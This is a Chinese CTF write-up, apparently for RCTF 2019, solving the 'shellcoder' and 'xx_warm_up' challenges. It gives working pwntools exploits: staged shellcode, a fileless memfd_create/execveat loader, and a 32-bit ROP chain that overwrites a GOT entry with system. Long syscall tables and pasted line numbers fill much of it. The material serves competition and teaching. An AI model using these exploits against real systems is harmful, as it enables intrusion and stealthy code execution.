jmp syscall fchdir: push 81 jmp syscallgetdents: push 78 jmp syscallexit: push 60 jmp syscallfind: push r13 push r12 mov rdx, rdi push rbp push rbx xor eax, eax mov ecx, 32 mov esi, 65536 sub rsp, 264 mov rdi, rsp rep stosq mov rdi, rdx call open cmp eax, -1 je .L30 mov ebx, eax mov edi, eax mov r12, rsp call fchdir mov edx, 256 mov rsi, rsp mov edi, ebx call getdents mov edi, ebx mov rbp, rax mov r13d, eax call close lea eax, 1[rbp] cmp eax, 1 jbe .L4 test ebp, ebp jle .L4 movzx eax, WORD PTR 16[rsp] mov ecx, DWORD PTR 18[rsp] mov rbx, rax movzx eax, BYTE PTR -1[rsp+rax] cmp al, 8 jne .L5 cmp ecx, 1734437990 je .L6.L5: lea rdi, 18[r12] xor ebp, ebp.L8: cmp ecx, 11822 setne sil cmp ecx, 46 setne dl test sil, dl je .L9 cmp al, 4 jne .L9 call find.L9: add ebp, ebx cmp r13d, ebp jle .L4 movsx rax, ebp lea rsi, 256[rsp] lea rdx, [r12+rax] add rax, rsi lea rdi, 18[rdx] mov ecx, DWORD PTR 18[rdx] movzx edx, WORD PTR 16[rdx] movzx eax, BYTE PTR -257[rdx+rax] mov rbx, rdx cmp al, 8 jne .L8 cmp ecx, 1734437990 jne .L8.L6: mov rdi,0x67616c662f2e push rdi push rsp pop rdi xor esi, esi xor eax, eax call open mov edx, 256 mov rsi, r12 mov edi, eax call read mov edi, 1 movsx rdx, eax mov rsi, r12 call write xor edi, edi call exit.L4: push 0x2e2e push rsp pop rdi call chdir add rsp, 264 pop rbx pop rbp pop r12 pop r13 ret.L30: mov rsi, 0x6e65706f20646162 push rsi push rsp pop rsi mov edi, 1 mov edx, 9 call write mov edi, 1 call exitmain: mov rdi, 0x67616c662f2e push rdi push rsp pop rdi sub rsp, 8 call find xor eax, eax add rsp, 8 ret exp： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201#coding:utf-8from pwn import *path = './shellcoder'local = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if local == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()shellcode = '''xchg rdi,rsipop dxsyscall'''p.recvuntil('shellcoder:')raw_input()p.send(asm(shellcode))#gdb.attach(p)raw_input()shellcode = '''_start: jmp mainsyscall: pop rax syscall retopen: push 2 jmp syscallread: push 0 jmp syscallwrite: push 1 jmp syscallclose: push 3 jmp syscallchdir: push 80 jmp syscall fchdir: push 81 jmp syscallgetdents: push 78 jmp syscallexit: push 60 jmp syscallfind: push r13 push r12 mov rdx, rdi push rbp push rbx xor eax, eax mov ecx, 32 mov esi, 65536 sub rsp, 264 mov rdi, rsp rep stosq mov rdi, rdx call open cmp eax, -1 je .L30 mov ebx, eax mov edi, eax mov r12, rsp call fchdir mov edx, 256 mov rsi, rsp mov edi, ebx call getdents mov edi, ebx mov rbp, rax mov r13d, eax call close lea eax, 1[rbp] cmp eax, 1 jbe .L4 test ebp, ebp jle .L4 movzx eax, WORD PTR 16[rsp] mov ecx, DWORD PTR 18[rsp] mov rbx, rax movzx eax, BYTE PTR -1[rsp+rax] cmp al, 8 jne .L5 cmp ecx, 1734437990 je .L6.L5: lea rdi, 18[r12] xor ebp, ebp.L8: cmp ecx, 11822 setne sil cmp ecx, 46 setne dl test sil, dl je .L9 cmp al, 4 jne .L9 call find.L9: add ebp, ebx cmp r13d, ebp jle .L4 movsx rax, ebp lea rsi, 256[rsp] lea rdx, [r12+rax] add rax, rsi lea rdi, 18[rdx] mov ecx, DWORD PTR 18[rdx] movzx edx, WORD PTR 16[rdx] movzx eax, BYTE PTR -257[rdx+rax] mov rbx, rdx cmp al, 8 jne .L8 cmp ecx, 1734437990 jne .L8.L6: mov rdi,0x67616c662f2e push rdi push rsp pop rdi xor esi, esi xor eax, eax call open mov edx, 256 mov rsi, r12 mov edi, eax call read mov edi, 1 movsx rdx, eax mov rsi, r12 call write xor edi, edi call exit.L4: push 0x2e2e push rsp pop rdi call chdir add rsp, 264 pop rbx pop rbp pop r12 pop r13 ret.L30: mov rsi, 0x6e65706f20646162 push rsi push rsp pop rsi mov edi, 1 mov edx, 9 call write mov edi, 1 call exitmain: mov rdi, 0x67616c662f2e push rdi push rsp pop rdi sub rsp, 8 call find xor eax, eax add rsp, 8 ret'''p.send('\x90'*7+asm(shellcode))if attach == 1: gdb.attach(p)p.interactive() exp2：新姿势：memfd_create，在内存中创建一个文件，execveat，给定一个文件描述符并执行它。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwn import *r = process(["./shellcoder"])context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'r.sendafter(":",asm("""push rdipop rsixchg edi,edxsyscallnop"""))#syscall(SYS_execveat,exec_fd,"",argv,NULL,AT_EMPTY_PATH);#stub_execveat(int dfd,char filename(point to zero),0,0,0x1000,0)#gdb.attach(r)raw_input()r.send("\x90"*0x30+asm(shellcraft.pushstr("xxrw"))+asm(""" mov rax,319 mov rdi,rsp mov rsi,0 syscall; //__NR_memfd_create('billy') mov rbx,raxloop: mov rdi,0 mov rsi,rsp mov rdx,0x400 mov rax,0 syscall; //read(0,rsp,0x400) cmp rax,0 je go mov rdi,rbx mov rsi,rsp mov rdx,rax mov rax,1 syscall; //write(3,rsp,0x400) jmp loopgo: mov rdi,rbx push 0 mov rsi,rsp xor rdx,rdx xor rcx,rcx mov r8,0x1000 xor r9,r9 mov rax,322 syscall; //execveat(3,rsp(point to zero),0,0,0x1000,0)"""))r.recvrepeat(1)raw_input()r.send(open("./find").read()) # another binary we want to executer.shutdown("send")r.interactive() ref：http://blog.eonew.cn/archives/982 https://balsn.tw/ctf_writeup/20190518-rctf2019/#shellcoder 系统调用表：x64：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334#ifndef _ASM_X86_UNISTD_64_H#define _ASM_X86_UNISTD_64_H 1#define __NR_read 0 // --&gt; important#define __NR_write 1 // --&gt; important#define __NR_open 2 // --&gt; important#define __NR_close 3 // --&gt; important#define __NR_stat 4#define __NR_fstat 5#define __NR_lstat 6#define __NR_poll 7 // --&gt; important#define __NR_lseek 8 // --&gt; important#define __NR_mmap 9 // --&gt; important#define __NR_mprotect 10 // --&gt; important#define __NR_munmap 11 #define __NR_brk 12 // --&gt; important#define __NR_rt_sigaction 13#define __NR_rt_sigprocmask 14#define __NR_rt_sigreturn 15 // --&gt; important#define __NR_ioctl 16 #define __NR_pread64 17#define __NR_pwrite64 18#define __NR_readv 19#define __NR_writev 20#define __NR_access 21#define __NR_pipe 22 // --&gt; important#define __NR_select 23#define __NR_sched_yield 24#define __NR_mremap 25#define __NR_msync 26#define __NR_mincore 27#define __NR_madvise 28#define __NR_shmget 29#define __NR_shmat 30#define __NR_shmctl 31#define __NR_dup 32 // --&gt; important#define __NR_dup2 33 // --&gt; important#define __NR_pause 34 // --&gt; important#define __NR_nanosleep 35 // --&gt; important#define __NR_getitimer 36#define __NR_alarm 37 // --&gt; important#define __NR_setitimer 38#define __NR_getpid 39 // --&gt; important#define __NR_sendfile 40#define __NR_socket 41 // --&gt; important#define __NR_connect 42 // --&gt; important#define __NR_accept 43 // --&gt; important#define __NR_sendto 44#define __NR_recvfrom 45#define __NR_sendmsg 46 // --&gt; important#define __NR_recvmsg 47 // --&gt; important#define __NR_shutdown 48 // --&gt; important#define __NR_bind 49 // --&gt; important#define __NR_listen 50 // --&gt; important#define __NR_getsockname 51#define __NR_getpeername 52#define __NR_socketpair 53#define __NR_setsockopt 54#define __NR_getsockopt 55#define __NR_clone 56#define __NR_fork 57#define __NR_vfork 58#define __NR_execve 59 // --&gt; important#define __NR_exit 60 // --&gt; important#define __NR_wait4 61#define __NR_kill 62#define __NR_uname 63#define __NR_semget 64#define __NR_semop 65#define __NR_semctl 66#define __NR_shmdt 67#define __NR_msgget 68#define __NR_msgsnd 69 // --&gt; important#define __NR_msgrcv 70#define __NR_msgctl 71#define __NR_fcntl 72#define __NR_flock 73#define __NR_fsync 74#define __NR_fdatasync 75#define __NR_truncate 76#define __NR_ftruncate 77#define __NR_getdents 78 // --&gt; important#define __NR_getcwd 79 // --&gt; important#define __NR_chdir 80 // --&gt; important#define __NR_fchdir 81 // --&gt; important#define __NR_rename 82#define __NR_mkdir 83 // --&gt; important#define __NR_rmdir 84 // --&gt; important#define __NR_creat 85#define __NR_link 86#define __NR_unlink 87#define __NR_symlink 88#define __NR_readlink 89#define __NR_chmod 90 // --&gt; important#define __NR_fchmod 91#define __NR_chown 92 // --&gt; important#define __NR_fchown 93#define __NR_lchown 94#define __NR_umask 95#define __NR_gettimeofday 96#define __NR_getrlimit 97#define __NR_getrusage 98#define __NR_sysinfo 99#define __NR_times 100#define __NR_ptrace 101#define __NR_getuid 102 // --&gt; important#define __NR_syslog 103#define __NR_getgid 104#define __NR_setuid 105#define __NR_setgid 106#define __NR_geteuid 107#define __NR_getegid 108#define __NR_setpgid 109#define __NR_getppid 110#define __NR_getpgrp 111#define __NR_setsid 112#define __NR_setreuid 113#define __NR_setregid 114#define __NR_getgroups 115#define __NR_setgroups 116#define __NR_setresuid 117#define __NR_getresuid 118#define __NR_setresgid 119#define __NR_getresgid 120#define __NR_getpgid 121#define __NR_setfsuid 122#define __NR_setfsgid 123#define __NR_getsid 124#define __NR_capget 125#define __NR_capset 126#define __NR_rt_sigpending 127#define __NR_rt_sigtimedwait 128#define __NR_rt_sigqueueinfo 129#define __NR_rt_sigsuspend 130#define __NR_sigaltstack 131#define __NR_utime 132#define __NR_mknod 133#define __NR_uselib 134#define __NR_personality 135#define __NR_ustat 136#define __NR_statfs 137#define __NR_fstatfs 138#define __NR_sysfs 139#define __NR_getpriority 140#define __NR_setpriority 141#define __NR_sched_setparam 142#define __NR_sched_getparam 143#define __NR_sched_setscheduler 144#define __NR_sched_getscheduler 145#define __NR_sched_get_priority_max 146#define __NR_sched_get_priority_min 147#define __NR_sched_rr_get_interval 148#define __NR_mlock 149#define __NR_munlock 150#define __NR_mlockall 151#define __NR_munlockall 152#define __NR_vhangup 153#define __NR_modify_ldt 154#define __NR_pivot_root 155#define __NR__sysctl 156#define __NR_prctl 157#define __NR_arch_prctl 158#define __NR_adjtimex 159#define __NR_setrlimit 160#define __NR_chroot 161#define __NR_sync 162#define __NR_acct 163#define __NR_settimeofday 164#define __NR_mount 165#define __NR_umount2 166#define __NR_swapon 167#define __NR_swapoff 168#define __NR_reboot 169#define __NR_sethostname 170#define __NR_setdomainname 171#define __NR_iopl 172#define __NR_ioperm 173#define __NR_create_module 174#define __NR_init_module 175#define __NR_delete_module 176#define __NR_get_kernel_syms 177#define __NR_query_module 178#define __NR_quotactl 179#define __NR_nfsservctl 180#define __NR_getpmsg 181#define __NR_putpmsg 182#define __NR_afs_syscall 183#define __NR_tuxcall 184#define __NR_security 185#define __NR_gettid 186#define __NR_readahead 187#define __NR_setxattr 188#define __NR_lsetxattr 189#define __NR_fsetxattr 190#define __NR_getxattr 191#define __NR_lgetxattr 192#define __NR_fgetxattr 193#define __NR_listxattr 194#define __NR_llistxattr 195#define __NR_flistxattr 196#define __NR_removexattr 197#define __NR_lremovexattr 198#define __NR_fremovexattr 199#define __NR_tkill 200#define __NR_time 201#define __NR_futex 202#define __NR_sched_setaffinity 203#define __NR_sched_getaffinity 204#define __NR_set_thread_area 205#define __NR_io_setup 206#define __NR_io_destroy 207#define __NR_io_getevents 208#define __NR_io_submit 209#define __NR_io_cancel 210#define __NR_get_thread_area 211#define __NR_lookup_dcookie 212#define __NR_epoll_create 213#define __NR_epoll_ctl_old 214#define __NR_epoll_wait_old 215#define __NR_remap_file_pages 216#define __NR_getdents64 217#define __NR_set_tid_address 218#define __NR_restart_syscall 219#define __NR_semtimedop 220#define __NR_fadvise64 221#define __NR_timer_create 222#define __NR_timer_settime 223#define __NR_timer_gettime 224#define __NR_timer_getoverrun 225#define __NR_timer_delete 226#define __NR_clock_settime 227#define __NR_clock_gettime 228#define __NR_clock_getres 229#define __NR_clock_nanosleep 230#define __NR_exit_group 231#define __NR_epoll_wait 232#define __NR_epoll_ctl 233#define __NR_tgkill 234#define __NR_utimes 235#define __NR_vserver 236#define __NR_mbind 237#define __NR_set_mempolicy 238#define __NR_get_mempolicy 239#define __NR_mq_open 240#define __NR_mq_unlink 241#define __NR_mq_timedsend 242#define __NR_mq_timedreceive 243#define __NR_mq_notify 244#define __NR_mq_getsetattr 245#define __NR_kexec_load 246#define __NR_waitid 247#define __NR_add_key 248#define __NR_request_key 249#define __NR_keyctl 250#define __NR_ioprio_set 251#define __NR_ioprio_get 252#define __NR_inotify_init 253#define __NR_inotify_add_watch 254#define __NR_inotify_rm_watch 255#define __NR_migrate_pages 256#define __NR_openat 257#define __NR_mkdirat 258#define __NR_mknodat 259#define __NR_fchownat 260#define __NR_futimesat 261#define __NR_newfstatat 262#define __NR_unlinkat 263#define __NR_renameat 264#define __NR_linkat 265#define __NR_symlinkat 266#define __NR_readlinkat 267#define __NR_fchmodat 268#define __NR_faccessat 269#define __NR_pselect6 270#define __NR_ppoll 271#define __NR_unshare 272#define __NR_set_robust_list 273#define __NR_get_robust_list 274#define __NR_splice 275#define __NR_tee 276#define __NR_sync_file_range 277#define __NR_vmsplice 278#define __NR_move_pages 279#define __NR_utimensat 280#define __NR_epoll_pwait 281#define __NR_signalfd 282#define __NR_timerfd_create 283#define __NR_eventfd 284#define __NR_fallocate 285#define __NR_timerfd_settime 286#define __NR_timerfd_gettime 287#define __NR_accept4 288#define __NR_signalfd4 289#define __NR_eventfd2 290#define __NR_epoll_create1 291#define __NR_dup3 292#define __NR_pipe2 293#define __NR_inotify_init1 294#define __NR_preadv 295#define __NR_pwritev 296#define __NR_rt_tgsigqueueinfo 297#define __NR_perf_event_open 298#define __NR_recvmmsg 299#define __NR_fanotify_init 300#define __NR_fanotify_mark 301#define __NR_prlimit64 302#define __NR_name_to_handle_at 303#define __NR_open_by_handle_at 304#define __NR_clock_adjtime 305#define __NR_syncfs 306#define __NR_sendmmsg 307#define __NR_setns 308#define __NR_getcpu 309#define __NR_process_vm_readv 310#define __NR_process_vm_writev 311#define __NR_kcmp 312#define __NR_finit_module 313#define __NR_sched_setattr 314#define __NR_sched_getattr 315#define __NR_renameat2 316#define __NR_seccomp 317 // --&gt; important#define __NR_getrandom 318#define __NR_memfd_create 319 // --&gt; important#define __NR_kexec_file_load 320#define __NR_bpf 321#define __NR_execveat 322 // --&gt; important#define __NR_userfaultfd 323 // --&gt; important#define __NR_membarrier 324#define __NR_mlock2 325#define __NR_copy_file_range 326#define __NR_preadv2 327#define __NR_pwritev2 328#endif /* _ASM_X86_UNISTD_64_H */ x32：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381#ifndef _ASM_X86_UNISTD_32_H#define _ASM_X86_UNISTD_32_H 1#define __NR_restart_syscall 0#define __NR_exit 1#define __NR_fork 2#define __NR_read 3#define __NR_write 4#define __NR_open 5#define __NR_close 6#define __NR_waitpid 7#define __NR_creat 8#define __NR_link 9#define __NR_unlink 10#define __NR_execve 11#define __NR_chdir 12#define __NR_time 13#define __NR_mknod 14#define __NR_chmod 15#define __NR_lchown 16#define __NR_break 17#define __NR_oldstat 18#define __NR_lseek 19#define __NR_getpid 20#define __NR_mount 21#define __NR_umount 22#define __NR_setuid 23#define __NR_getuid 24#define __NR_stime 25#define __NR_ptrace 26#define __NR_alarm 27#define __NR_oldfstat 28#define __NR_pause 29#define __NR_utime 30#define __NR_stty 31#define __NR_gtty 32#define __NR_access 33#define __NR_nice 34#define __NR_ftime 35#define __NR_sync 36#define __NR_kill 37#define __NR_rename 38#define __NR_mkdir 39#define __NR_rmdir 40#define __NR_dup 41#define __NR_pipe 42#define __NR_times 43#define __NR_prof 44#define __NR_brk 45#define __NR_setgid 46#define __NR_getgid 47#define __NR_signal 48#define __NR_geteuid 49#define __NR_getegid 50#define __NR_acct 51#define __NR_umount2 52#define __NR_lock 53#define __NR_ioctl 54#define __NR_fcntl 55#define __NR_mpx 56#define __NR_setpgid 57#define __NR_ulimit 58#define __NR_oldolduname 59#define __NR_umask 60#define __NR_chroot 61#define __NR_ustat 62#define __NR_dup2 63#define __NR_getppid 64#define __NR_getpgrp 65#define __NR_setsid 66#define __NR_sigaction 67#define __NR_sgetmask 68#define __NR_ssetmask 69#define __NR_setreuid 70#define __NR_setregid 71#define __NR_sigsuspend 72#define __NR_sigpending 73#define __NR_sethostname 74#define __NR_setrlimit 75#define __NR_getrlimit 76#define __NR_getrusage 77#define __NR_gettimeofday 78#define __NR_settimeofday 79#define __NR_getgroups 80#define __NR_setgroups 81#define __NR_select 82#define __NR_symlink 83#define __NR_oldlstat 84#define __NR_readlink 85#define __NR_uselib 86#define __NR_swapon 87#define __NR_reboot 88#define __NR_readdir 89#define __NR_mmap 90#define __NR_munmap 91#define __NR_truncate 92#define __NR_ftruncate 93#define __NR_fchmod 94#define __NR_fchown 95#define __NR_getpriority 96#define __NR_setpriority 97#define __NR_profil 98#define __NR_statfs 99#define __NR_fstatfs 100#define __NR_ioperm 101#define __NR_socketcall 102#define __NR_syslog 103#define __NR_setitimer 104#define __NR_getitimer 105#define __NR_stat 106#define __NR_lstat 107#define __NR_fstat 108#define __NR_olduname 109#define __NR_iopl 110#define __NR_vhangup 111#define __NR_idle 112#define __NR_vm86old 113#define __NR_wait4 114#define __NR_swapoff 115#define __NR_sysinfo 116#define __NR_ipc 117#define __NR_fsync 118#define __NR_sigreturn 119#define __NR_clone 120#define __NR_setdomainname 121#define __NR_uname 122#define __NR_modify_ldt 123#define __NR_adjtimex 124#define __NR_mprotect 125#define __NR_sigprocmask 126#define __NR_create_module 127#define __NR_init_module 128#define __NR_delete_module 129#define __NR_get_kernel_syms 130#define __NR_quotactl 131#define __NR_getpgid 132#define __NR_fchdir 133#define __NR_bdflush 134#define __NR_sysfs 135#define __NR_personality 136#define __NR_afs_syscall 137#define __NR_setfsuid 138#define __NR_setfsgid 139#define __NR__llseek 140#define __NR_getdents 141#define __NR__newselect 142#define __NR_flock 143#define __NR_msync 144#define __NR_readv 145#define __NR_writev 146#define __NR_getsid 147#define __NR_fdatasync 148#define __NR__sysctl 149#define __NR_mlock 150#define __NR_munlock 151#define __NR_mlockall 152#define __NR_munlockall 153#define __NR_sched_setparam 154#define __NR_sched_getparam 155#define __NR_sched_setscheduler 156#define __NR_sched_getscheduler 157#define __NR_sched_yield 158#define __NR_sched_get_priority_max 159#define __NR_sched_get_priority_min 160#define __NR_sched_rr_get_interval 161#define __NR_nanosleep 162#define __NR_mremap 163#define __NR_setresuid 164#define __NR_getresuid 165#define __NR_vm86 166#define __NR_query_module 167#define __NR_poll 168#define __NR_nfsservctl 169#define __NR_setresgid 170#define __NR_getresgid 171#define __NR_prctl 172#define __NR_rt_sigreturn 173#define __NR_rt_sigaction 174#define __NR_rt_sigprocmask 175#define __NR_rt_sigpending 176#define __NR_rt_sigtimedwait 177#define __NR_rt_sigqueueinfo 178#define __NR_rt_sigsuspend 179#define __NR_pread64 180#define __NR_pwrite64 181#define __NR_chown 182#define __NR_getcwd 183#define __NR_capget 184#define __NR_capset 185#define __NR_sigaltstack 186#define __NR_sendfile 187#define __NR_getpmsg 188#define __NR_putpmsg 189#define __NR_vfork 190#define __NR_ugetrlimit 191#define __NR_mmap2 192#define __NR_truncate64 193#define __NR_ftruncate64 194#define __NR_stat64 195#define __NR_lstat64 196#define __NR_fstat64 197#define __NR_lchown32 198#define __NR_getuid32 199#define __NR_getgid32 200#define __NR_geteuid32 201#define __NR_getegid32 202#define __NR_setreuid32 203#define __NR_setregid32 204#define __NR_getgroups32 205#define __NR_setgroups32 206#define __NR_fchown32 207#define __NR_setresuid32 208#define __NR_getresuid32 209#define __NR_setresgid32 210#define __NR_getresgid32 211#define __NR_chown32 212#define __NR_setuid32 213#define __NR_setgid32 214#define __NR_setfsuid32 215#define __NR_setfsgid32 216#define __NR_pivot_root 217#define __NR_mincore 218#define __NR_madvise 219#define __NR_getdents64 220#define __NR_fcntl64 221#define __NR_gettid 224#define __NR_readahead 225#define __NR_setxattr 226#define __NR_lsetxattr 227#define __NR_fsetxattr 228#define __NR_getxattr 229#define __NR_lgetxattr 230#define __NR_fgetxattr 231#define __NR_listxattr 232#define __NR_llistxattr 233#define __NR_flistxattr 234#define __NR_removexattr 235#define __NR_lremovexattr 236#define __NR_fremovexattr 237#define __NR_tkill 238#define __NR_sendfile64 239#define __NR_futex 240#define __NR_sched_setaffinity 241#define __NR_sched_getaffinity 242#define __NR_set_thread_area 243#define __NR_get_thread_area 244#define __NR_io_setup 245#define __NR_io_destroy 246#define __NR_io_getevents 247#define __NR_io_submit 248#define __NR_io_cancel 249#define __NR_fadvise64 250#define __NR_exit_group 252#define __NR_lookup_dcookie 253#define __NR_epoll_create 254#define __NR_epoll_ctl 255#define __NR_epoll_wait 256#define __NR_remap_file_pages 257#define __NR_set_tid_address 258#define __NR_timer_create 259#define __NR_timer_settime 260#define __NR_timer_gettime 261#define __NR_timer_getoverrun 262#define __NR_timer_delete 263#define __NR_clock_settime 264#define __NR_clock_gettime 265#define __NR_clock_getres 266#define __NR_clock_nanosleep 267#define __NR_statfs64 268#define __NR_fstatfs64 269#define __NR_tgkill 270#define __NR_utimes 271#define __NR_fadvise64_64 272#define __NR_vserver 273#define __NR_mbind 274#define __NR_get_mempolicy 275#define __NR_set_mempolicy 276#define __NR_mq_open 277#define __NR_mq_unlink 278#define __NR_mq_timedsend 279#define __NR_mq_timedreceive 280#define __NR_mq_notify 281#define __NR_mq_getsetattr 282#define __NR_kexec_load 283#define __NR_waitid 284#define __NR_add_key 286#define __NR_request_key 287#define __NR_keyctl 288#define __NR_ioprio_set 289#define __NR_ioprio_get 290#define __NR_inotify_init 291#define __NR_inotify_add_watch 292#define __NR_inotify_rm_watch 293#define __NR_migrate_pages 294#define __NR_openat 295#define __NR_mkdirat 296#define __NR_mknodat 297#define __NR_fchownat 298#define __NR_futimesat 299#define __NR_fstatat64 300#define __NR_unlinkat 301#define __NR_renameat 302#define __NR_linkat 303#define __NR_symlinkat 304#define __NR_readlinkat 305#define __NR_fchmodat 306#define __NR_faccessat 307#define __NR_pselect6 308#define __NR_ppoll 309#define __NR_unshare 310#define __NR_set_robust_list 311#define __NR_get_robust_list 312#define __NR_splice 313#define __NR_sync_file_range 314#define __NR_tee 315#define __NR_vmsplice 316#define __NR_move_pages 317#define __NR_getcpu 318#define __NR_epoll_pwait 319#define __NR_utimensat 320#define __NR_signalfd 321#define __NR_timerfd_create 322#define __NR_eventfd 323#define __NR_fallocate 324#define __NR_timerfd_settime 325#define __NR_timerfd_gettime 326#define __NR_signalfd4 327#define __NR_eventfd2 328#define __NR_epoll_create1 329#define __NR_dup3 330#define __NR_pipe2 331#define __NR_inotify_init1 332#define __NR_preadv 333#define __NR_pwritev 334#define __NR_rt_tgsigqueueinfo 335#define __NR_perf_event_open 336#define __NR_recvmmsg 337#define __NR_fanotify_init 338#define __NR_fanotify_mark 339#define __NR_prlimit64 340#define __NR_name_to_handle_at 341#define __NR_open_by_handle_at 342#define __NR_clock_adjtime 343#define __NR_syncfs 344#define __NR_sendmmsg 345#define __NR_setns 346#define __NR_process_vm_readv 347#define __NR_process_vm_writev 348#define __NR_kcmp 349#define __NR_finit_module 350#define __NR_sched_setattr 351#define __NR_sched_getattr 352#define __NR_renameat2 353#define __NR_seccomp 354#define __NR_getrandom 355#define __NR_memfd_create 356#define __NR_bpf 357#define __NR_execveat 358#define __NR_socket 359#define __NR_socketpair 360#define __NR_bind 361#define __NR_connect 362#define __NR_listen 363#define __NR_accept4 364#define __NR_getsockopt 365#define __NR_setsockopt 366#define __NR_getsockname 367#define __NR_getpeername 368#define __NR_sendto 369#define __NR_sendmsg 370#define __NR_recvfrom 371#define __NR_recvmsg 372#define __NR_shutdown 373#define __NR_userfaultfd 374#define __NR_membarrier 375#define __NR_mlock2 376#define __NR_copy_file_range 377#define __NR_preadv2 378#define __NR_pwritev2 379#endif /* _ASM_X86_UNISTD_32_H */ xx_warm_upgrep -ri flag . &amp;&amp; grep -ril flag .在当前目录及其子目录下搜寻带有flag行的文件。 先是一个python脚本，最开始有一个sha256的爆破，成功后脚本会让你输入，输入只能包含字母与数字，然后会把输入作为xx_warm_up的参数传给程序，然后启动。 重定向到远程：socat tcp-l:10000,fork exec:&quot;python ./pow.py&quot; 此题调试有一点麻烦，因为gdb.attach只能在有读入的地方断下来，但是此题没有输入点，所以没法用gdb.attach，所以只能用gdb直接加载调。写个简单的debug.txt，在gdb里source即可。 方法一因为题目是32位，本身就带有aslr的脆弱性，先栈迁移，然后直接改__libc_start_main@got为system（此题没有输入函数，只可用其本身的一些特殊的gadget来模拟read），然后跳到__libc_start_main@plt上即可。直接爆破，1/4096的概率。 exp：payload生成脚本： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#coding:utf-8from pwn import *path = './xx_warm_up'P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'def hex2str(addr): addr = str(hex(addr))[2:].rjust(8,'0') return addrdef make_addr(addr): addr_str = hex2str(addr) i = 0 real_str = '' while i &lt; 8: real_str += addr_str[6-i] + addr_str[7-i] i += 2 return real_strdef str2num(string): length = len(string) i = 0 tmp = '' while i &lt; length: tmp += str(hex(ord(string[i])))[2:] i += 1 length = len(tmp) tmp= tmp.ljust(4*(length/4+1),'0') print tmp return tmp #0x08048618: pop ebx; pop esi; pop edi; pop ebp; ret; pop_4 = 0x08048618buf = 0x0804A040#0x0804840e: leave; ret;#0x08048516: pop ebx; pop esi; pop ebp; ret; leave_ret = 0x0804840e cmd = 'grep -ri flag .'#cmd = 'find ./ -iname *flag* | xargs cat'#cmd = 'find ./ | grep flag'payload = make_addr(0x080483DB)+make_addr(0x08048618)payload+= make_addr(0x0804A800)+make_addr(buf+0x1C)payload+= make_addr(8*4)+make_addr(0x0804A800-4)payload+= make_addr(leave_ret)payload+= make_addr(0x080483DB)+make_addr(0x08048516)payload+= make_addr(P.got['__libc_start_main'])+make_addr(0x0804a074)payload+= make_addr(3)payload+= make_addr(P.plt['__libc_start_main'])+make_addr(0x00e3cda0)payload+= make_addr(0x0804a084)payload = payload.ljust(0x10*8,'1')payload+= make_addr(buf+4)payload+= str2num(cmd)print payload 远程脚本： 123456789101112131415161718192021222324252627282930#coding:utf-8from pwn import *from hashlib import sha256import stringimport randomcontext(os='linux',arch='i386')context.log_level = 'debug'p = remote('127.0.0.1',10000)chal = p.recvuntil('\n')[:-1]sol = ''.join(random.choice(string.letters+string.digits) for _ in xrange(4))result = sha256(chal + sol).hexdigest().startswith('00000')while result == False: sol = ''.join(random.choice(string.letters+string.digits) for _ in xrange(4)) result = sha256(chal + sol).hexdigest().startswith('00000')print 'brute force success!!!'p.send(sol)sleep(1)payload = 'db8304081886040800a804085ca0040820000000fca704080e840408db830408168504080ca0040874a0040803000000c0820408a0cde30084a004081111111144a0040867726570202d726920666c6167202e00'p.sendline(payload)result = p.recv(timeout=5)print result debug文件： 123b *0x08048593set args db8304081886040800a804085ca0040820000000fca704080e840408db830408168504080ca0040874a0040803000000c0820408a0cde30084a004081111111144a0040867726570202d726920666c6167202e00r 效果： 方法二一些特殊的指令： 12345678910111213141516171819202122232425/* Save state */pushfl /*将状态寄存器eflags压栈*/pushw %fs /*将fs寄存器压栈*/pushw %gs /*将gs压栈*/pushal /*保存通用寄存器中的上下文环境*/popw %gs /*弹出%gs寄存器，下同*/popw %fspopw %espopw %dspopfl /*弹出至eflags寄存器*/在pushal指令中各寄存器的入栈顺序分别为：%eax-&gt;%ecx-&gt;%edx-&gt;%ebx-&gt;%esp-&gt;%ebp-&gt;%esi-&gt;%edi在popal指令中弹出顺序与pushal入栈顺序相反：%edi-&gt;%esi-&gt;%ebp-&gt;%esp-&gt;%ebx-&gt;%edx-&gt;%ecx-&gt;%eaxCLD指令功能：将标志zd寄存器Flag的方向标志位DF清零。在字串操作中使变址寄存器SI或DI的地址指针自动增加，回字串处理由前往后。例如，以下三条指令执行后，SI自动加1，更新为0001H：CLDMOV SI，0000HLODSB 